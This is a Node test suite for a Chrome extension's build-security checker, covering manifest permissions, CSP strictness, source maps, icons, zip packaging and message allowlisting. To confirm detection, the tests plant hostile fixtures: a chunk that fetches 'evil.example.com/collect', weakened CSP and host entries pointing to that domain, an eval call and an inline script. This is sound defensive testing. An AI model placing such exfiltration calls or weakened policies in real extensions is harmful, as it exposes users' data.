"use strict";

const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const test = require("node:test");
const { spawnSync } = require("node:child_process");

const root = path.resolve(__dirname, "..");
const outDir = path.join(root, "apps/extension/.output/chrome-mv3");
const zipDir = path.join(root, "apps/extension/.output");
const {
  ALLOWED_HOSTS,
  checkExtensionBuild,
  documentedPermissions,
  parseCsp,
} = require(path.join(root, "scripts/check-extension-build.js"));
const { SIZES, renderPng } = require(path.join(root, "scripts/generate-extension-icons.js"));
const { isShellMessage, MESSAGE_ACTIONS } = { ...readMessagesContract() };

function readMessagesContract() {
  // Allowlist lives in the CommonJS state module (Prompt 024); shell tests keep validating the
  // same guard semantics against that source of truth.
  const state = require(path.join(root, "apps/extension/state/index.cjs"));
  const unique = [...state.MESSAGE_ACTIONS];
  return {
    MESSAGE_ACTIONS: unique,
    isShellMessage: (value) => state.parseMessage(value).ok,
  };
}

function runNpm(script) {
  const isWindows = process.platform === "win32";
  const result = spawnSync(isWindows ? "npm.cmd" : "npm", ["run", script], {
    cwd: root,
    encoding: "utf8",
    shell: isWindows,
  });
  assert.equal(result.status, 0, `npm run ${script} failed: ${result.stderr || result.stdout}`);
}

function ensureBuild() {
  if (!fs.existsSync(path.join(outDir, "manifest.json"))) {
    runNpm("build:extension");
  }
}

function ensureZip() {
  ensureBuild();
  const existing = fs
    .readdirSync(zipDir)
    .filter((name) => name.endsWith(".zip") && !name.includes("sources"));
  if (existing.length) {
    return path.join(zipDir, existing[0]);
  }
  runNpm("zip:extension");
  const created = fs.readdirSync(zipDir).filter((name) => name.endsWith(".zip"));
  assert.ok(created.length, "zip:extension produced no archive");
  return path.join(zipDir, created[0]);
}

function copyBuild() {
  const temp = fs.mkdtempSync(path.join(os.tmpdir(), "moss-ext-"));
  fs.cpSync(outDir, temp, { recursive: true });
  return temp;
}

function mutateManifest(dir, mutate) {
  const file = path.join(dir, "manifest.json");
  const manifest = JSON.parse(fs.readFileSync(file, "utf8"));
  mutate(manifest);
  fs.writeFileSync(file, JSON.stringify(manifest));
}

function codes(result) {
  return result.violations.map((violation) => violation.code);
}

test("P023-T01 build produces an MV3 manifest with Side Panel as the product surface", () => {
  ensureBuild();
  const manifest = JSON.parse(fs.readFileSync(path.join(outDir, "manifest.json"), "utf8"));
  assert.equal(manifest.manifest_version, 3);
  assert.equal(manifest.background.service_worker, "background.js");
  assert.equal(manifest.action?.default_popup, undefined);
  assert.ok(manifest.side_panel?.default_path === "sidepanel.html" || fs.existsSync(path.join(outDir, "sidepanel.html")));
  assert.equal(manifest.options_ui.page, "settings.html");
  assert.equal(manifest.options_ui.open_in_tab, false);
  for (const page of ["sidepanel.html", "settings.html", "background.js"]) {
    assert.ok(fs.existsSync(path.join(outDir, page)), `${page} missing`);
  }
  assert.ok(manifest.permissions.includes("sidePanel"));
  assert.deepEqual(manifest.host_permissions, ALLOWED_HOSTS);
});

test("P023-T02 automated gates pass on the real build", () => {
  ensureBuild();
  const result = checkExtensionBuild({ outDir });
  assert.deepEqual(result.violations, []);
  assert.equal(result.ok, true);
});

test("P023-T03 every permission is documented and every documented permission is used", () => {
  ensureBuild();
  const declared = documentedPermissions(path.join(root, "docs/engineering/extension-shell.md"));
  const manifest = JSON.parse(fs.readFileSync(path.join(outDir, "manifest.json"), "utf8"));
  assert.deepEqual([...manifest.permissions].sort(), [...declared].sort());
  assert.deepEqual(manifest.optional_permissions, []);

  const extra = copyBuild();
  mutateManifest(extra, (manifest) => manifest.permissions.push("tabs"));
  assert.ok(codes(checkExtensionBuild({ outDir: extra })).includes("undocumented-permission"));

  const missing = copyBuild();
  mutateManifest(missing, (manifest) => {
    manifest.permissions = ["storage", "alarms"];
  });
  assert.ok(codes(checkExtensionBuild({ outDir: missing })).includes("unused-documented-permission"));

  for (const dir of [extra, missing]) {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("P023-T04 CSP must stay strict and origin-limited", () => {
  ensureBuild();
  const manifest = JSON.parse(fs.readFileSync(path.join(outDir, "manifest.json"), "utf8"));
  const directives = parseCsp(manifest.content_security_policy.extension_pages);
  assert.deepEqual(directives.get("script-src"), ["'self'"]);
  assert.deepEqual(directives.get("object-src"), ["'none'"]);
  assert.deepEqual(directives.get("base-uri"), ["'none'"]);

  const cases = [
    ["script-src 'self' 'unsafe-eval'; object-src 'none'", "unsafe-csp"],
    ["script-src 'self' https://cdn.example.com; object-src 'none'", "weak-script-src"],
    ["script-src 'self'; object-src 'self'", "weak-object-src"],
    ["script-src 'self'; object-src 'none'; connect-src https://evil.example.com", "unexpected-connect-src"],
  ];
  for (const [csp, expected] of cases) {
    const dir = copyBuild();
    mutateManifest(dir, (manifest) => {
      manifest.content_security_policy.extension_pages = csp;
    });
    assert.ok(codes(checkExtensionBuild({ outDir: dir })).includes(expected), `${csp} -> ${expected}`);
    fs.rmSync(dir, { recursive: true, force: true });
  }

  const hostDir = copyBuild();
  mutateManifest(hostDir, (manifest) => manifest.host_permissions.push("https://evil.example.com/"));
  assert.ok(codes(checkExtensionBuild({ outDir: hostDir })).includes("unexpected-host"));
  fs.rmSync(hostDir, { recursive: true, force: true });
});

test("P023-T05 source maps, eval, and Node polyfills are rejected", () => {
  ensureBuild();
  for (const file of fs.readdirSync(path.join(outDir, "chunks"))) {
    assert.ok(!file.endsWith(".map"), `${file} is a shipped source map`);
  }

  const planted = [
    ["chunks/planted.js.map", '{"version":3}', "source-map"],
    ["chunks/planted-eval.js", "export const run = () => eval('1+1');", "eval"],
    ["chunks/planted-node.js", 'import { readFile } from "node:fs";', "node-builtin-import"],
    ["chunks/planted-map-ref.js", "//# sourceMappingURL=planted.js.map", "source-map-reference"],
    [
      "chunks/planted-remote.js",
      'export const go = () => fetch("https://evil.example.com/collect");',
      "remote-endpoint",
    ],
  ];
  for (const [relative, contents, expected] of planted) {
    const dir = copyBuild();
    fs.writeFileSync(path.join(dir, relative), contents);
    assert.ok(codes(checkExtensionBuild({ outDir: dir })).includes(expected), `${relative} -> ${expected}`);
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("P023-T06 icons are valid PNGs and reproducible from the generator", () => {
  ensureBuild();
  for (const size of SIZES) {
    const built = fs.readFileSync(path.join(outDir, `icon/${size}.png`));
    const source = fs.readFileSync(path.join(root, `apps/extension/src/public/icon/${size}.png`));
    assert.ok(built.equals(source), `icon ${size} differs from source`);
    assert.ok(built.equals(renderPng(size)), `icon ${size} is not reproducible`);
    assert.equal(built.subarray(1, 4).toString("ascii"), "PNG");
  }

  const dir = copyBuild();
  fs.writeFileSync(path.join(dir, "icon/48.png"), "not a png");
  assert.ok(codes(checkExtensionBuild({ outDir: dir })).includes("invalid-icon"));
  fs.rmSync(dir, { recursive: true, force: true });
});

test("P023-T07 shipped HTML has no inline script or handlers", () => {
  ensureBuild();
  for (const page of ["sidepanel.html", "settings.html"]) {
    const html = fs.readFileSync(path.join(outDir, page), "utf8");
    for (const tag of html.match(/<script[^>]*>[\s\S]*?<\/script>/g) || []) {
      assert.match(tag, /\ssrc="/, `${page} has an inline script`);
    }
    assert.doesNotMatch(html, /\son[a-z]+="/, `${page} has an inline handler`);
  }

  const dir = copyBuild();
  fs.writeFileSync(path.join(dir, "sidepanel.html"), "<html><body><script>alert(1)</script></body></html>");
  assert.ok(codes(checkExtensionBuild({ outDir: dir })).includes("inline-script"));
  fs.rmSync(dir, { recursive: true, force: true });
});

test("P023-T08 zip packaging produces a store-ready archive", () => {
  const archive = ensureZip();
  const buffer = fs.readFileSync(archive);
  assert.ok(buffer.length > 1024, "archive is suspiciously small");
  assert.equal(buffer.subarray(0, 2).toString("ascii"), "PK");
  const names = buffer.toString("latin1");
  for (const entry of ["manifest.json", "sidepanel.html", "settings.html", "background.js"]) {
    assert.ok(names.includes(entry), `archive is missing ${entry}`);
  }
  assert.ok(/icon[/\\]128\.png/.test(names), "archive is missing icons");
  assert.match(path.basename(archive), /^moss-extension-\d+\.\d+\.\d+-chrome\.zip$/);
});

test("P023-T09 extension sources avoid Node and provider transport", () => {
  const srcDir = path.join(root, "apps/extension/src");
  const files = [];
  const walk = (dir) => {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        walk(full);
      } else if (/\.(ts|tsx)$/.test(entry.name)) {
        files.push(full);
      }
    }
  };
  walk(srcDir);
  assert.ok(files.length > 0);

  for (const file of files) {
    const text = fs.readFileSync(file, "utf8");
    const relative = path.relative(root, file);
    assert.doesNotMatch(text, /from\s+["']node:/, `${relative} imports a Node builtin`);
    assert.doesNotMatch(text, /@moss\/provider-adapter/, `${relative} reaches the provider boundary`);
    assert.doesNotMatch(text, /\beval\s*\(/, `${relative} uses eval`);
    assert.doesNotMatch(text, /moss\.stanford\.edu/, `${relative} references the provider host`);
  }

  const manifest = JSON.parse(fs.readFileSync(path.join(root, "apps/extension/package.json"), "utf8"));
  assert.equal(manifest.dependencies["@moss/provider-adapter"], undefined);
});

test("P023-T10 message router allowlists actions and rejects malformed input", () => {
  assert.ok(MESSAGE_ACTIONS.includes("shell/ping"));
  assert.ok(MESSAGE_ACTIONS.includes("shell/open-workspace"));
  assert.ok(MESSAGE_ACTIONS.includes("shell/status"));
  assert.equal(isShellMessage({ action: "shell/ping", requestId: "abc" }), true);
  assert.equal(isShellMessage({ action: "shell/wipe-disk", requestId: "abc" }), false);
  assert.equal(isShellMessage({ action: "shell/ping" }), false);
  assert.equal(isShellMessage({ action: "shell/ping", requestId: "" }), false);
  assert.equal(isShellMessage(null), false);
  assert.equal(isShellMessage("shell/ping"), false);

  const background = fs.readFileSync(
    path.join(root, "apps/extension/src/entrypoints/background.ts"),
    "utf8",
  );
  assert.match(background, /createExtensionRouter|handleMessage/);
  assert.match(background, /setPanelBehavior/);
  assert.match(background, /openPanelOnActionClick:\s*true/);
});

test("P023-T11 Side Panel replaces tab-opening workspace navigation", () => {
  const messages = fs.readFileSync(path.join(root, "apps/extension/src/shared/messages.ts"), "utf8");
  assert.doesNotMatch(messages, /tabs\.create/);
  assert.doesNotMatch(messages, /workspace\.html/);
  assert.ok(!fs.existsSync(path.join(root, "apps/extension/src/entrypoints/popup")));
  const workflow = fs.readFileSync(
    path.join(root, "apps/extension/src/shared/workflow/WorkflowApp.tsx"),
    "utf8",
  );
  assert.match(workflow, /shell--sidepanel|Advanced options|Confirm language/);
});
